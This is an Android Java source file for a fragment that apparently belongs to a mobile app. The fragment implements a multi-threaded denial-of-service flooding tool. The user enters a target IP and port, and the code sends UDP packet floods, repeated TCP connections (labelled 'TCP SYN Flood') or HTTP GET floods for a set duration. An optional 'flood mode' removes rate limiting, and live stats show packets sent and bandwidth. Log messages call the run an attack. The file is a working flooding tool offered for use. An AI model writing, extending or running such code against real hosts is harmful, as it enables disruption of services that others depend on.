package com.qian.cc4;

import android.content.SharedPreferences;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.*;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import java.io.IOException;
import java.net.*;
import java.util.Date;
import java.util.Random;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.atomic.AtomicLong;

public class DdosTestFragment extends BaseFragment {
    
    private EditText etTargetIp, etTargetPort, etDdosThreads, etPacketSize, etDuration, etPacketsPerSecond;
    private Button btnStartDdos, btnStopDdos, btnClearLogDdos, btnSaveConfigDdos, btnLoadConfigDdos;
    private TextView tvDdosLog, tvSentPackets, tvSendRate, tvRemainingTime, tvBandwidth, tvSuccessCount, tvFailCount, tvSuccessRate;
    private Spinner spinnerPacketType;
    private CheckBox cbRandomSourceIp, cbFloodMode, cbKeepScreenOnDdos;
    private ProgressBar progressBarDdos;
    
    private AtomicLong sentPackets = new AtomicLong(0);
    private AtomicLong successCount = new AtomicLong(0);
    private AtomicLong failCount = new AtomicLong(0);
    private AtomicLong startTime = new AtomicLong(0);
    private volatile boolean isAttacking = false;
    private ExecutorService attackExecutor;
    private Handler mainHandler;
    private SharedPreferences preferences;
    
    private final String[] packetTypes = {"UDP Flood", "TCP SYN Flood", "HTTP Flood"};
    
    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_ddos_test, container, false);
        initViews(view);
        setupPacketTypeSpinner();
        mainHandler = new Handler(Looper.getMainLooper());
        preferences = requireActivity().getSharedPreferences("ddos_config", getContext().MODE_PRIVATE);
        loadConfiguration();
        return view;
    }
    
    private void initViews(View view) {
        etTargetIp = view.findViewById(R.id.etTargetIp);
        etTargetPort = view.findViewById(R.id.etTargetPort);
        etDdosThreads = view.findViewById(R.id.etDdosThreads);
        etPacketSize = view.findViewById(R.id.etPacketSize);
        etDuration = view.findViewById(R.id.etDuration);
        etPacketsPerSecond = view.findViewById(R.id.etPacketsPerSecond);
        
        btnStartDdos = view.findViewById(R.id.btnStartDdos);
        btnStopDdos = view.findViewById(R.id.btnStopDdos);
        btnClearLogDdos = view.findViewById(R.id.btnClearLogDdos);
        btnSaveConfigDdos = view.findViewById(R.id.btnSaveConfigDdos);
        btnLoadConfigDdos = view.findViewById(R.id.btnLoadConfigDdos);
        
        tvDdosLog = view.findViewById(R.id.tvDdosLog);
        tvSentPackets = view.findViewById(R.id.tvSentPackets);
        tvSendRate = view.findViewById(R.id.tvSendRate);
        tvRemainingTime = view.findViewById(R.id.tvRemainingTime);
        tvBandwidth = view.findViewById(R.id.tvBandwidth);
        tvSuccessCount = view.findViewById(R.id.tvSuccessCount);
        tvFailCount = view.findViewById(R.id.tvFailCount);
        tvSuccessRate = view.findViewById(R.id.tvSuccessRate);
        
        spinnerPacketType = view.findViewById(R.id.spinnerPacketType);
        cbRandomSourceIp = view.findViewById(R.id.cbRandomSourceIp);
        cbFloodMode = view.findViewById(R.id.cbFloodMode);
        cbKeepScreenOnDdos = view.findViewById(R.id.cbKeepScreenOnDdos);
        progressBarDdos = view.findViewById(R.id.progressBarDdos);

        btnStartDdos.setOnClickListener(v -> startAttack());
        btnStopDdos.setOnClickListener(v -> stopAttack());
        btnClearLogDdos.setOnClickListener(v -> clearLog());
        btnSaveConfigDdos.setOnClickListener(v -> saveConfiguration());
        btnLoadConfigDdos.setOnClickListener(v -> loadConfiguration());
        
        cbKeepScreenOnDdos.setOnCheckedChangeListener((buttonView, isChecked) -> {
            if (getActivity() != null) {
                if (isChecked) {
                    getActivity().getWindow().addFlags(android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                } else {
                    getActivity().getWindow().clearFlags(android.view.WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON);
                }
            }
        });
        
        cbFloodMode.setOnCheckedChangeListener((buttonView, isChecked) -> {
            etPacketsPerSecond.setEnabled(!isChecked);
            if (isChecked) {
                etPacketsPerSecond.setText("1000");
            }
        });
    }
    
    private void setupPacketTypeSpinner() {
        ArrayAdapter<String> adapter = new ArrayAdapter<>(requireContext(), 
            android.R.layout.simple_spinner_item, packetTypes);
        adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        spinnerPacketType.setAdapter(adapter);
    }
    
    private void startAttack() {
        String targetIp = etTargetIp.getText().toString().trim();
        if (targetIp.isEmpty()) {
            showToast("请输入目标IP");
            return;
        }
        
        try {
            int targetPort = Integer.parseInt(etTargetPort.getText().toString());
            int threads = Integer.parseInt(etDdosThreads.getText().toString());
            int packetSize = Integer.parseInt(etPacketSize.getText().toString());
            int duration = Integer.parseInt(etDuration.getText().toString());
            int packetsPerSecond = Integer.parseInt(etPacketsPerSecond.getText().toString());
            
            if (threads <= 0 || duration <= 0 || packetSize <= 0) {
                showToast("参数必须大于0");
                return;
            }
            
            if (packetSize > 65507) {
                showToast("包大小不能超过65507字节");
                return;
            }
            
            resetStats();
            isAttacking = true;
            updateButtonStates();
            progressBarDdos.setVisibility(View.VISIBLE);
            progressBarDdos.setMax(duration);
            
            attackExecutor = Executors.newFixedThreadPool(threads);
            startTime.set(System.currentTimeMillis());
            
            String packetType = packetTypes[spinnerPacketType.getSelectedItemPosition()];
            logMessage("开始" + packetType + "攻击...");
            logMessage("目标: " + targetIp + ":" + targetPort);
            logMessage("线程数: " + threads + ", 持续时间: " + duration + "秒");
            
            final boolean floodMode = cbFloodMode.isChecked();

            for (int i = 0; i < threads; i++) {
                final int threadId = i;
                attackExecutor.execute(() -> {
                    try {
                        Random random = new Random();
                        long startTime = System.currentTimeMillis();
                        long endTime = startTime + (duration * 1000L);

                        switch (spinnerPacketType.getSelectedItemPosition()) {
                            case 0: // UDP Flood
                                udpFloodAttack(targetIp, targetPort, packetSize, floodMode, 
                                             packetsPerSecond, endTime, threadId, random);
                                break;
                            case 1: // TCP SYN Flood
                                tcpSynFloodAttack(targetIp, targetPort, floodMode, 
                                                packetsPerSecond, endTime, threadId, random);
                                break;
                            case 2: // HTTP Flood
                                httpFloodAttack(targetIp, targetPort, floodMode, 
                                              packetsPerSecond, endTime, threadId);
                                break;
                        }
                        
                    } catch (Exception e) {
                        logMessage("线程" + threadId + "异常: " + e.getMessage());
                    }
                });
            }
            
            // 启动线程
            startStatsUpdater(duration);
            
        } catch (NumberFormatException e) {
            showToast("请输入有效的数字参数");
        } catch (Exception e) {
            showToast("启动失败: " + e.getMessage());
        }
    }
    
    private void udpFloodAttack(String targetIp, int targetPort, int packetSize, 
                               boolean floodMode, int packetsPerSecond, 
                               long endTime, int threadId, Random random) {
        try {
            DatagramSocket socket = new DatagramSocket();
            socket.setSoTimeout(5000);
            
            byte[] packetData = new byte[packetSize];
            random.nextBytes(packetData); // 随机填充
            
            InetAddress targetAddress = InetAddress.getByName(targetIp);
            
            while (isAttacking && System.currentTimeMillis() < endTime) {
                try {
                    DatagramPacket packet = new DatagramPacket(
                        packetData, packetData.length, targetAddress, targetPort
                    );
                    
                    socket.send(packet);
                    sentPackets.incrementAndGet();
                    successCount.incrementAndGet();
                    
                    // 速率控制
                    if (!floodMode && packetsPerSecond > 0) {
                        long delay = 1000L / packetsPerSecond;
                        if (delay > 0) {
                            Thread.sleep(delay);
                        }
                    }
                    
                } catch (IOException e) {
                    sentPackets.incrementAndGet();
                    failCount.incrementAndGet();
                    logMessage("线程" + threadId + "UDP发送失败: " + e.getMessage());
                } catch (InterruptedException e) {
                    break;
                }
            }
            
            socket.close();
            
        } catch (Exception e) {
            logMessage("线程" + threadId + "UDP异常: " + e.getMessage());
        }
    }
    
    private void tcpSynFloodAttack(String targetIp, int targetPort, boolean floodMode,
                                  int packetsPerSecond, long endTime, int threadId, Random random) {
        try {
            while (isAttacking && System.currentTimeMillis() < endTime) {
                try {
                    Socket socket = new Socket();
                    socket.connect(new InetSocketAddress(targetIp, targetPort), 3000);
                    socket.close();
                    sentPackets.incrementAndGet();
                    successCount.incrementAndGet();
                    
                    // 速率控制
                    if (!floodMode && packetsPerSecond > 0) {
                        long delay = 1000L / packetsPerSecond;
                        if (delay > 0) {
                            Thread.sleep(delay);
                        }
                    }
                    
                } catch (IOException e) {
                    sentPackets.incrementAndGet();
                    failCount.incrementAndGet();
                } catch (InterruptedException e) {
                    break;
                }
            }
        } catch (Exception e) {
            logMessage("线程" + threadId + "TCP SYN异常: " + e.getMessage());
        }
    }
    
    private void httpFloodAttack(String targetIp, int targetPort, boolean floodMode,
                               int packetsPerSecond, long endTime, int threadId) {
        try {
            URL url = new URL("http://" + targetIp + ":" + targetPort + "/");
            
            while (isAttacking && System.currentTimeMillis() < endTime) {
                try {
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setRequestMethod("GET");
                    connection.setConnectTimeout(5000);
                    connection.setReadTimeout(5000);

                    int responseCode = connection.getResponseCode();
                    sentPackets.incrementAndGet();
                    successCount.incrementAndGet();
                    connection.disconnect();

                    if (!floodMode && packetsPerSecond > 0) {
                        long delay = 1000L / packetsPerSecond;
                        if (delay > 0) {
                            Thread.sleep(delay);
                        }
                    }
                    
                } catch (IOException e) {
                    sentPackets.incrementAndGet();
                    failCount.incrementAndGet();
                } catch (InterruptedException e) {
                    break;
                }
            }
        } catch (Exception e) {
            logMessage("线程" + threadId + "HTTP Flood异常: " + e.getMessage());
        }
    }
    
    private void startStatsUpdater(int totalDuration) {
        new Thread(() -> {
            int elapsed = 0;
            while (isAttacking && elapsed < totalDuration) {
                try {
                    Thread.sleep(1000);
                    elapsed++;

                    final int currentElapsed = elapsed;
                    mainHandler.post(() -> progressBarDdos.setProgress(currentElapsed));
                    
                    updateStats(totalDuration);
                } catch (InterruptedException e) {
                    break;
                }
            }

            if (elapsed >= totalDuration) {
                mainHandler.post(() -> {
                    stopAttack();
                    logMessage("攻击已完成，总计发送包数: " + sentPackets.get());
                    logMessage("成功: " + successCount.get() + ", 失败: " + failCount.get());
                    
                    // 计算并显示成功率
                    if (sentPackets.get() > 0) {
                        double successRate = (double) successCount.get() / sentPackets.get() * 100;
                        tvSuccessRate.setText(String.format("%.1f%%", successRate));
                    }
                });
            }
        }).start();
    }
    
    private void updateStats(int totalDuration) {
        mainHandler.post(() -> {
            long current = System.currentTimeMillis();
            long elapsed = (current - startTime.get()) / 1000;
            long remaining = Math.max(0, totalDuration - elapsed);
            
            tvSentPackets.setText(String.valueOf(sentPackets.get()));
            tvSuccessCount.setText(String.valueOf(successCount.get()));
            tvFailCount.setText(String.valueOf(failCount.get()));
            tvRemainingTime.setText(remaining + "s");
            
            // 计算发送速率
            if (elapsed > 0) {
                long rate = sentPackets.get() / elapsed;
                tvSendRate.setText(rate + " pps");
                
                // 计算成功率
                if (sentPackets.get() > 0) {
                    double successRate = (double) successCount.get() / sentPackets.get() * 100;
                    tvSuccessRate.setText(String.format("%.1f%%", successRate));
                }
                
                // 计算带宽 (粗略估算)
                try {
                    int packetSize = Integer.parseInt(etPacketSize.getText().toString());
                    long bandwidth = (sentPackets.get() * packetSize) / elapsed / 1024;
                    tvBandwidth.setText(bandwidth + " KB/s");
                } catch (NumberFormatException e) {
                    tvBandwidth.setText("0 KB/s");
                }
            }
        });
    }
    
    private void stopAttack() {
        isAttacking = false;
        if (attackExecutor != null) {
            attackExecutor.shutdownNow();
        }
        
        updateButtonStates();
        progressBarDdos.setVisibility(View.GONE);
        
        logMessage("攻击已停止");
        logMessage("总计发送包数: " + sentPackets.get());
        logMessage("成功: " + successCount.get() + ", 失败: " + failCount.get());
        
        // 保存配置
        saveConfiguration();
    }
    
    private void clearLog() {
        mainHandler.post(() -> {
            tvDdosLog.setText("日志已清空\n准备就绪，请输入目标IP开始测试...\n");
            resetStats();
        });
    }
    
    private void resetStats() {
        sentPackets.set(0);
        successCount.set(0);
        failCount.set(0);
        tvSentPackets.setText("0");
        tvSuccessCount.setText("0");
        tvFailCount.setText("0");
        tvSendRate.setText("0 pps");
        tvRemainingTime.setText("0s");
        tvBandwidth.setText("0 KB/s");
        tvSuccessRate.setText("0%");
    }
    
    private void updateButtonStates() {
        btnStartDdos.setEnabled(!isAttacking);
        btnStopDdos.setEnabled(isAttacking);
    }
    
    private void logMessage(final String message) {
        mainHandler.post(() -> {
            String currentText = tvDdosLog.getText().toString();
            String newText = new Date().toString().substring(11, 19) + " - " + message + "\n" + currentText;
            if (newText.length() > 5000) {
                newText = newText.substring(0, 5000) + "\n日志过长，已截断...";
            }
            tvDdosLog.setText(newText);
        });
    }
    
    private void showToast(String message) {
        Toast.makeText(getContext(), message, Toast.LENGTH_SHORT).show();
    }
    
    private void saveConfiguration() {
        SharedPreferences.Editor editor = preferences.edit();
        editor.putString("targetIp", etTargetIp.getText().toString());
        editor.putString("targetPort", etTargetPort.getText().toString());
        editor.putString("threads", etDdosThreads.getText().toString());
        editor.putString("packetSize", etPacketSize.getText().toString());
        editor.putString("duration", etDuration.getText().toString());
        editor.putString("packetsPerSecond", etPacketsPerSecond.getText().toString());
        editor.putInt("packetType", spinnerPacketType.getSelectedItemPosition());
        editor.putBoolean("randomSourceIp", cbRandomSourceIp.isChecked());
        editor.putBoolean("floodMode", cbFloodMode.isChecked());
        editor.putBoolean("keepScreenOn", cbKeepScreenOnDdos.isChecked());
        editor.apply();
        showToast("配置已保存");
    }
    
    private void loadConfiguration() {
        etTargetIp.setText(preferences.getString("targetIp", ""));
        etTargetPort.setText(preferences.getString("targetPort", "80"));
        etDdosThreads.setText(preferences.getString("threads", "10"));
        etPacketSize.setText(preferences.getString("packetSize", "1024"));
        etDuration.setText(preferences.getString("duration", "60"));
        etPacketsPerSecond.setText(preferences.getString("packetsPerSecond", "100"));
        spinnerPacketType.setSelection(preferences.getInt("packetType", 0));
        cbRandomSourceIp.setChecked(preferences.getBoolean("randomSourceIp", false));
        cbFloodMode.setChecked(preferences.getBoolean("floodMode", false));
        cbKeepScreenOnDdos.setChecked(preferences.getBoolean("keepScreenOn", false));
    }
    
    @Override
    public void onDestroyView() {
        super.onDestroyView();
        stopAttack();
    }
}
